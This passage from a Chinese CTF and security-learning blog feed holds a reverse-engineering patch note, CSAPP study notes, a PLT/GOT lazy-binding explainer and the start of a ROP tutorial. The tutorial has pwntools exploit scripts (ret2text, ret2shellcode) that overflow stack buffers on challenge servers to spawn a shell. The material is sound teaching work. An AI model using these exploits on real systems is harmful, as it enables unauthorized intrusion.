data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> idc</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>addr <span class=\"token operator\">=</span> <span class=\"token number\">0x14C6</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">961</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    idc<span class=\"token punctuation\">.</span>patch_byte<span class=\"token punctuation\">(</span>addr<span class=\"token operator\">+</span>i<span class=\"token punctuation\">,</span> idc<span class=\"token punctuation\">.</span>get_wide_byte<span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span>addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0x66</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>然后汇编修改上面的 jnz 变 jz 下面的变 jmp 保存 patch 再异或保存文件 再运行就行了</p>\n<p>IDA-》edit-》Patch program-》Assemble 修改，然后 IDA-》edit-》Patch program-》Apply patches to input file 保存 (可选择备份但不如自己备份)</p>\n<p><img data-src=\"/images/image-20230204124943398.png\" alt=\"image.png\"></p>\n<p>loc_164A 就是输出 flag 函数</p>\n<p>执行结果:</p>\n<p><img data-src=\"/images/image-20230204130419527.png\" alt=\"image.png\"></p>\n<p you_4re_a_p@tch_master_0r_reverse_ma5ter>flag 为 hgame</p>\n",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/01/07/CSAPP%E3%81%AE%E5%AD%A6%E7%BF%92%E8%A8%98%E9%8C%B2/",
            "url": "https://3cly.github.io/2023/01/07/CSAPP%E3%81%AE%E5%AD%A6%E7%BF%92%E8%A8%98%E9%8C%B2/",
            "title": "CSAPPの学習記録",
            "date_published": "2023-01-06T16:17:12.000Z",
            "content_html": "<h1 id=\"第一章-计算机系统漫游\"><a class=\"markdownIt-Anchor\" href=\"#第一章-计算机系统漫游\">#</a> 第一章 计算机系统漫游</h1>\n<h2 id=\"11信息就是位上下文\"><a class=\"markdownIt-Anchor\" href=\"#11信息就是位上下文\">#</a> 1.1 信息就是位 + 上下文</h2>\n<p>1. 文件都以字节序列方式存储，只由 ASCII 字符构成称为文本文件，其他所有文件称为二进制文件</p>\n<p>2. 区分相同位串代表的不同数据对象的唯一方法是我们读到这些数据对象时的上下文，不同上下文中，同样的字节序列可能表示一个整数浮点数字符串或者机器指令</p>\n<h2 id=\"12程序被其他程序翻译成不同的格式\"><a class=\"markdownIt-Anchor\" href=\"#12程序被其他程序翻译成不同的格式\">#</a> 1.2 程序被其他程序翻译成不同的格式</h2>\n<p>1. 把源程序文件 hello.c 翻译成可执行目标文件 hello 的过程有四个阶段（预处理，编译，汇编，链接） ，分别由预处理器，编译器，汇编器，链接器一同完成，他们共同构成了编译系统（看书上图片）<br>\n2. 预处理阶段：预处理器（cpp）根据 #开头的命令修改原始的 C 程序，并得新的 C 程序（以.i 为扩展名）<br>\n3. 编译阶段：编译器（cll）将 hello.i 翻译成文本文件 hello.s，包含一个汇编语言程序<br>\n 4. 汇编阶段：汇编器（as）把 hello.s 翻译成机器语言指令，并把这些指令打包成可重定位目标程序的格式，结果保存在 hello.o（二进制文件）<br>\n5. 链接阶段：hello 调用了 printf 函数，printf 函数存在于一个名为 printf.o 的单独的预处理好的目标文件中。有链接器（ld）把 printf.o 合并到 hello.o 当中。结果得到 hello 文件</p>\n<h2 id=\"13-了解编译系统如何工作的好处\"><a class=\"markdownIt-Anchor\" href=\"#13-了解编译系统如何工作的好处\">#</a> 1.3 了解编译系统如何工作的好处</h2>\n<ol>\n<li>优化程序性能</li>\n<li>理解链接时出现的错误</li>\n<li>避免安全漏洞</li>\n</ol>\n<h2 id=\"14-处理器读并解释存在内存中的指令\"><a class=\"markdownIt-Anchor\" href=\"#14-处理器读并解释存在内存中的指令\">#</a> 1.4 处理器读并解释存在内存中的指令</h2>\n<h3 id=\"shell\"><a class=\"markdownIt-Anchor\" href=\"#shell\">#</a> shell</h3>\n<p>hello.c 源程序已经被编译系统翻译成可执行文件 hello 并被存放在磁盘上。要想在 Unix 系统上运行该可执行文件，我们将它的文件名输入到称为 shell 的应用程序</p>\n<pre><code>linux&gt; ./hello\nhello, world\nlinux&gt;\n</code></pre>\n<p>shell 是一个命令行解释器如果命令行的第一个单词不是 shell 的内置命令，那么 shell 就会假设他是个可执行文件的名字，他将加载并执行这个文件。</p>\n<h3 id=\"硬件\"><a class=\"markdownIt-Anchor\" href=\"#硬件\">#</a> 硬件</h3>\n<p>1. 系统硬件组成：总线，I/O 设备，主存，处理器<br>\n 2. 总线：贯穿整个系统的一组电子管道，携带信息字节并负责在各个部件间传递（传递信息用的）通常总线被设计成传送定长的字节块（字 word）。字中的字节数是一个基本的系统参数（32 位 4 个，64 位 8 个）<br>\n3.I/O 设备：系统与外部世界联系通道（鼠标键盘，显示器，磁盘），I/O 通过控制器（I/O 设备本身或者主印刷电路板上的芯片组）或适配器（插在主板插槽）与总线相连<br>\n 4. 主存：临时存储设备，处理器执行程序的时候用来存放程序和数据的，有一组动态随即存取存储器（DRAM）芯片组成<br>\n 5. 处理器：中央处理器（CPU）是解释（或执行）存储在主存中指令的引擎。其和行是一个代写哦啊为一个字的存储设备（或寄存器），称为<strong>程序计数器（PC）</strong>，在任何时候 PC 都指向主存中的某条机器指令（及含有该指令的地址）。处理器从 PC 指向的内存处读指令，解释指令中的位，然后更新 PC，使其指向下一条指令，而这些指令不一定在内存中连续<br>\n。处理器操作主要围绕主存，寄存器文件，算数 / 逻辑单元进行<br>\n 6. 寄存器文件（register file）是一个小存储设备，由一些单个字长的寄存器组成，每个寄存器有唯一的文件。<br>\n7.** 算术 / 逻辑单元（ALU）** 计算数据和地址值</p>\n<p>CPU 在指令的要求下可能执行的操作如下</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">操作</th>\n<th style=\"text-align:center\">具体</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">加载</td>\n<td style=\"text-align:center\">从主存复制一个字节或字到寄存器，以覆盖寄存器原来的内容</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">存储</td>\n<td style=\"text-align:center\">从寄存器复制一个字节或字到主存的某个位置，覆盖主存原来的内容</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">操作</td>\n<td style=\"text-align:center\">把两个寄存器的内容复制到 ALU，ALU 对这两个字做算术运算，并将结果存放到一个寄存器中，以覆盖寄存器原来内容</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">跳转</td>\n<td style=\"text-align:center\">从指令本身抽取一个字，并将这个字复制到 PC 以覆盖 PC 原来的值</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"进程\"><a class=\"markdownIt-Anchor\" href=\"#进程\">#</a> 进程</h3>\n<p>进程可以看成是操作系统对正在运行的程序的一种抽象，在一个系统中可以运行多个进程，这些进程对外表现好像是独占硬件，实际上是通过不同进程之间进程的交互执行实现的，这个过程叫上下文切换（context switch）</p>\n<h3 id=\"线程\"><a class=\"markdownIt-Anchor\" href=\"#线程\">#</a> 线程</h3>\n<p>一个进程可以由多个线程组成，运行在一个上下文环境中，共享代码以及全局数据。因为共享数据，使得其比一般的进程更加高效（花在 context switch 的时间少）。</p>\n<h3 id=\"虚拟存储器\"><a class=\"markdownIt-Anchor\" href=\"#虚拟存储器\">#</a> 虚拟存储器</h3>\n<p>给进程提供的一个好像自己独占主存的假象，对于进程的所使用的虚拟存储器可以分成一下几个部分：</p>\n<ul>\n<li>程序代码和数据</li>\n<li>堆，可以动态扩展或者收缩，供像 malloc 和 free 这样的 C 语言中的库进行调用</li>\n<li>共享库</li>\n<li>栈，可以动态扩展或者收缩，用于编译器的函数调用</li>\n<li>内核虚拟存储器</li>\n</ul>\n",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2022/12/30/%E2%80%9CPLT%E8%A1%A8%E4%B8%8EGOT%E8%A1%A8%E3%81%AE%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E2%80%9D/",
            "url": "https://3cly.github.io/2022/12/30/%E2%80%9CPLT%E8%A1%A8%E4%B8%8EGOT%E8%A1%A8%E3%81%AE%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E2%80%9D/",
            "title": "PLT表与GOT表の延迟绑定机制学习",
            "date_published": "2022-12-30T13:42:08.000Z",
            "content_html": "<h1 id=\"plt表与got表-延迟绑定机制学习\"><a class=\"markdownIt-Anchor\" href=\"#plt表与got表-延迟绑定机制学习\">#</a> PLT 表与 GOT 表 | 延迟绑定机制学习</h1>\n<h2 id=\"前置知识\"><a class=\"markdownIt-Anchor\" href=\"#前置知识\">#</a> 前置知识</h2>\n<h3 id=\"符号及符号表\"><a class=\"markdownIt-Anchor\" href=\"#符号及符号表\">#</a> 符号及符号表</h3>\n<p>在编程语言中，不可避免的要定义全局变量，函数.<br>\n 在编译器编译源文件的时候，函数名转换为内存地址的引用，未定义的函数名要分配重定位条目，已初始化且初始化不为 0 变量要存入.data 节，初始化为 0 的存入.bss 节，未初始化的则指向 COMMON 伪节中.<br>\n 执行这些操作，需要一个合适的数据结构以组织这些信息和高效的获取数据。于是这一个个的函数名和全局变量名就称为符号，并有序的组织在一起，称为符号表.</p>\n<p>这里做个测试<img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221230203518.png\" alt=\"image.png\"></p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221230203826.png\" alt=\"image.png\"></p>\n<p>首先我们来看符号 main 和 func。在源程序中定义了两个函数，分别是函数 main 和函数 func，所以符号表中二者的类型是函数。又函数 main 和 func 是全局可见的，因此这里的 Bind 字段也是全局的 (GLOBAL)。关于 Ndx 表示的是 section 的索引值。关于索引值与具体 section 的对应关系，可以查看 section header table 来确定</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221230204054.png\" alt=\"image.png\"></p>\n<p>又函数 main 和 func 所在的位置是 text section, 所以这里符号 main 和 func 的 Ndx 为 2</p>\n<p>Value (16 进制) 表示函数相对于.text section 起始位置的偏移量 Size 表示所占字节数 由图知函数 func 是从 0 开始，大小是 46 个字节 所以函数 main 的起始地址是 0x2e (46), 紧跟在函数 func 之后 字段 Vis 在 C 语言中没有使用 我们可以忽略这个字段</p>\n<p>关于符号 printf 虽然他也是个函数 但是函数 printf 只是在 main.c 中被引用，由于它的定义并不在 main.c 中，所以它的 Ndx 是 UND (undefine) 的类型</p>\n<p>关于全局变量 count 和 value, 符号表中类型是 OBJECT 表明该符号是个数据对象 (变量和数组等在符号表中的类型都用 OBJECT 来表示) 虽然二者都是全局变量 但二者 Ndx 值不同也就是说二者处于不同的 section 中 导致二者位于不同 section 的原因是 count 经过了初始化，而 value 没有</p>\n<p>main.c 中还定义了一个局部变量 x 这个局部变量没有出现在符号表中，这是因为局部变量在运行时是在栈中被管理，链接器对此类符号并不感兴趣，所以局部变量的信息不会出现在符号表中</p>\n<h3 id=\"动态链接与静态链接\"><a class=\"markdownIt-Anchor\" href=\"#动态链接与静态链接\">#</a> 动态链接与静态链接</h3>\n<p>关于动态链接与静态链接，大佬打了个比方：如果我的文章引用了别人的一部分文字，在我发布文章的时候把别人的段落复制到我的文章里面就属于静态连接，而做一个超链接让你们自己去看就属于动态链接了</p>\n<h4 id=\"静态链接\"><a class=\"markdownIt-Anchor\" href=\"#静态链接\">#</a> 静态链接</h4>\n<p>一段代码从文本编辑器上产生到最终能够在机器上运行，经历了非常多的阶段，概括而言，至少包含了以下几个阶段：</p>\n<ul>\n<li>编译：编译器通过词法分析，语法分析，语义分析等，将一段代码翻译成汇编语言</li>\n<li>汇编：将汇编语言翻译成机器指令</li>\n<li>链接：解决符号之间的重定位问题</li>\n<li>装载：将可执行文件加载到内存</li>\n</ul>\n<p>静态链接就是在装载之前，就完成所有的符号引用的一种链接方式。静态链接的处理过程分为 2 个步骤：</p>\n<ol>\n<li>空间与地址的分配。扫描所有的目标文件，合并相似段，收集当中所有的符号信息。</li>\n<li>符号解析与重定位。调整代码位置。</li>\n</ol>\n<p><strong>静态链接的优缺点</strong></p>\n<ul>\n<li>优点： 简单</li>\n<li>缺点：\n<ul>\n<li>浪费内存空间。在多进程的操作系统下，同一时间，内存中可能存在多个相同的公共库函数。</li>\n<li>程序的开发与发布流程受模块制约。 只要有一个模块更新，那么就需要重新编译打包整个代码。</li>\n</ul>\n</li>\n</ul>\n<p>为了解决以上 2 个问题，就诞生了动态链接。</p>\n<h4 id=\"动态链接\"><a class=\"markdownIt-Anchor\" href=\"#动态链接\">#</a> 动态链接</h4>\n<p>基本思想就是将对符号的重定位推迟到程序运行时才进行。</p>\n<p>只要推迟到运行时进行符号的重定位，就能解决静态链接的两个缺点。</p>\n<p>对于第一个缺点：在运行时重定位，如果在运行过程中调用了公共库函数或者其他模块的函数，系统只需要在内存中维护一份公共库代码即可，只要将不同应用程序对公共库函数的调用地址设置成相同即可。</p>\n<p>对于第二个缺点：理论上只要将需要替换的模块更新，无需将整个应用程序打包。</p>\n<p>对于静态链接来说，系统只需要加载一个文件（可执行文件）到内存即可，但是在动态链接下，系统需要映射一个主程序和多个动态链接模块，因此，相比于静态链接，动态链接使得内存的空间分布更加复杂。</p>\n<h2 id=\"pltgot\"><a class=\"markdownIt-Anchor\" href=\"#pltgot\">#</a> PLT&amp;GOT</h2>\n<p>linux 下的动态链接是通过 PLT&amp;GOT 来实现的</p>\n<p>这里来看一个现成的 c 语言编写的还未链接的.o 文件</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720230101185801.png\" alt=\"image.png\"></p>\n<p>printf () 和函数是在 glibc 动态库里面的，只有当程序运行起来的时候才能确定地址，所以此时的 printf () 函数先用 fc ff ff ff 也就是有符号数的 -4 代替</p>\n<p>运行时进行重定位是无法修改代码段的，只能将 printf 重定位到数据段，但是已经编译好的程序，调用 printf 的时候怎么才能找到这个地址呐？</p>\n<p>链接器会额外生成一小段代码，通过这段代码来获取 printf () 的地址，像下面这样，进行链接的时候只需要对 printf_stub () 进行重定位操作就可以</p>\n<figure class=\"highlight plain\"><figcaption data-lang=\"plain\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>.text</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>...</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>// 调用printf的call指令</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>call printf_stub</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>...</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>printf_stub:</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    jmp rax // 跳过去执行printf函数</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>.data</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>...</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>printf函数的储存地址,这里储存printf函数重定位后的地址</pre></td></tr></table></figure><p>总体来说，动态链接每个函数需要两个东西：</p>\n<p>1、用来存放外部函数地址的数据段</p>\n<p>2、用来获取数据段记录的外部函数地址的代码</p>\n<p>对应有两个表，一个用来存放外部的函数地址的数据表称为<strong>全局偏移表</strong>（<strong>GOT</strong>, Global Offset Table），那个存放额外代码的表称为<strong>程序链接表</strong>（<strong>PLT</strong>，Procedure Link Table）</p>\n<p><img data-src=\"/images/1574513788142-e66171f3-6300-4e14-ab57-cc301c936829.jpeg\" alt=\"image.jpeg\"></p>\n<p>可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址</p>\n<p>那我们可以发现，在这里面想要通过 plt 表获取函数的地址，首先要保证 got 表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，linux 引入了延迟绑定机制</p>\n<h3 id=\"延迟绑定\"><a class=\"markdownIt-Anchor\" href=\"#延迟绑定\">#</a> 延迟绑定</h3>\n<p>只有动态库函数在被调用时，才会地址解析和重定位工作，为此可以使用类似这样的代码来实现：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 一开始没有重定位的时候将 printf@got 填成 lookup_printf 的地址</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">void</span> printf@<span class=\"token function\">plt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>address_good<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    jmp <span class=\"token operator\">*</span>printf@got   </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>lookup_printf<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    调用重定位函数查找 printf 地址，并写到 printf@got</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">goto</span> address_good<span class=\"token punctuation\">;</span><span class=\"token comment\">// 再返回去执行 address_good</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>说明一下这段代码工作流程，一开始，printf@got 是 lookup_printf 函数的地址，这个函数用来寻找 printf () 的地址，然后写入 printf@got，lookup_printf 执行完成后会返回到 address_good，这样再 jmp 的话就可以直接跳到 printf 来执行了</p>\n<p>也就是说这样的机制的话如果不知道 printf 的地址，就去找一下，知道的话就直接去 jmp 执行 printf 了</p>\n<p>关于这个怎么找的笔记因为测试时候忘记截图了就没贴上来了 下面说些结论</p>\n<p>在想要调用的函数没有被调用过，想要调用他的时候，是按照这个过程来调用的</p>\n<p>xxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; 公共 @plt -&gt; _dl_runtime_resolve</p>\n<p>在 i386 架构下，除了每个函数占用一个 GOT 表项外，GOT 表项还保留了３个公共表项，也即 got 的前３项，分别保存：</p>\n<p><strong>got [0]: 本 ELF 动态段 (.dynamic 段）的装载地址</strong></p>\n<p><strong>got [1]：本 ELF 的 link_map 数据结构描述符地址</strong></p>\n<p><strong>got [2]：_dl_runtime_resolve 函数的地址</strong></p>\n<p>动态链接器在加载完 ELF 之后，都会将这３地址写到 GOT 表的前３项</p>\n<p>流程图:</p>\n<p>第一次调用:</p>\n<p><img data-src=\"/images/1580739542097-a6d2738b-9a08-4b5f-acd8-d5f2c4d77278.jpeg\" alt=\"image.jpeg\"></p>\n<p>之后再次调用:</p>\n<p><img data-src=\"/images/1580739570228-64997692-8003-4c10-acf2-2c8d91095e3c.jpeg\" alt=\"image.jpeg\"></p>\n",
            "tags": [
                "二进制"
            ]
        },
        {
            "id": "https://3cly.github.io/2022/12/15/%E5%9F%BA%E6%9C%ACROP%E5%AD%A6%E4%B9%A0/",
            "url": "https://3cly.github.io/2022/12/15/%E5%9F%BA%E6%9C%ACROP%E5%AD%A6%E4%B9%A0/",
            "title": "基本ROP学习",
            "date_published": "2022-12-15T13:12:06.000Z",
            "content_html": "<p>用 p64 () 发送数据时，是发送的字节流，也就是比特流（二进制流）。</p>\n<h1 id=\"基本-rop学习\"><a class=\"markdownIt-Anchor\" href=\"#基本-rop学习\">#</a> 基本 ROP 学习</h1>\n<p>背景：NX 保护的开启 (No-eXecute, 不可执行保护）</p>\n<p>核心思想：栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</p>\n<p>ROP 攻击一般得满足如下条件:</p>\n<ul>\n<li>\n<p>程序存在溢出，并且可以控制返回地址。</p>\n</li>\n<li>\n<p>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</p>\n<h2 id=\"ret2text\"><a class=\"markdownIt-Anchor\" href=\"#ret2text\">#</a> ret2text</h2>\n</li>\n</ul>\n<p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。</p>\n<h3 id=\"pwn1_1\"><a class=\"markdownIt-Anchor\" href=\"#pwn1_1\">#</a> pwn1_1</h3>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221220132950.png\" alt=\"image.png\"></p>\n<p>只开了 nx 保护</p>\n<p><code>read()</code>  函数读的数据长度比输入的字符 <code>&amp;buf</code>  的长度长，能够造成溢出</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221215211911.png\" alt=\"image.png\"><br>\n<img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221215212110.png\" alt=\"image.png\"></p>\n<p>发现后门函数</p>\n<p>利用 ida 计算偏移量</p>\n<p>用返回地址减去起始地址求得偏移量，这里 buf 相对于返回地址得偏移量为 0x18</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221220135857.png\" alt=\"image.png\"></p>\n<p>exp 直通后门</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># coding=utf-8</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"gxh191.top\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">25537</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>sh_addr<span class=\"token operator\">=</span><span class=\"token number\">0x40119E</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>sh_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221215212337.png\" alt=\"image.png\"></p>\n<h3 id=\"pwn2_1\"><a class=\"markdownIt-Anchor\" href=\"#pwn2_1\">#</a> pwn2_1</h3>\n<p>先 checksec 查看保护  只开了 nx 保护<br>\n<img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221215212443.png\" alt=\"image.png\"></p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221215212710.png\" alt=\"image.png\"></p>\n<p>也是栈溢出   read 函数 读 buf 大小 0x1000<br>\n 但是多了个 if 和 strlen 需要用 \\0 来控制字符串长度避免 exit 了<br>\n这是因为 strlen 遇到 \\0 会停止读取，在写脚本时将填充 buf 的字符换成’\\0’即可绕过 strlen 的限制</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221220133554.png\" alt=\"image.png\"><br>\n<img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221215212829.png\" alt=\"image.png\"><br>\n<img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221215212857.png\" alt=\"image.png\"><br>\n 直接跳转到 b4ckd00r 函数会退出运行。因此 2-1 并不能像 1-1 一样直接跳转到 b4ckd00r 就行了 而是需要通过栈溢出跳转到 path<br>\n 脚本如下</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'gxh191.top'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">25540</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'\\0'</span><span class=\"token operator\">*</span><span class=\"token number\">16</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4011EF</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"ret2shellcode\"><a class=\"markdownIt-Anchor\" href=\"#ret2shellcode\">#</a> ret2shellcode</h2>\n<p>ret2shellcode，即控制程序执行 shellcode 代码。</p>\n<h3 id=\"pwn2_2\"><a class=\"markdownIt-Anchor\" href=\"#pwn2_2\">#</a> pwn2_2</h3>\n<p>checksec 查看保护</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221220132950.png\" alt=\"image.png\"></p>\n<p>典中典之 NX</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221220140613.png\" alt=\"image.png\"></p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720221220140735.png\" alt=\"image.png\"></p>\n<p>无现成后门可用</p>\n<p><code>mprotect((&amp;phone_number &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7);</code></p>\n<p>发现 mprotect 函数修改了 phone_number bss 段的权限</p>\n<p>第三个参数为 7 表示<strong>可读可写可执行</strong></p>\n<p>即思路是将 shellcode 写入 phone_number bss 段 再通过栈溢出来执行</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>io<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'gxh191.top'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">25542</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>shellcode<span class=\"token operator\">=</span>asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">16</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4040A0</span><span class=\"token operator\">+</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4040A0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'ber:'</span><span class=\"token punctuation\">,</span>shellcode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'uf:'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"ret2syscall\"><a class=\"markdownIt-Anchor\" href=\"#ret2syscall\">#</a> ret2syscall</h2>\n<h3 id=\"原理\"><a class=\"markdownIt-Anchor\" href=\"#原理\">#</a> 原理</h3>\n<p>ret2syscall，即控制程序执行系统调用，获取 shell。</p>\n<p>pop eax 将栈顶数据弹到 eax 里面</p>\n<h4 id=\"以ctfwiki上的例子做一下\"><a class=\"markdownIt-Anchor\" href=\"#以ctfwiki上的例子做一下\">#</a> 以 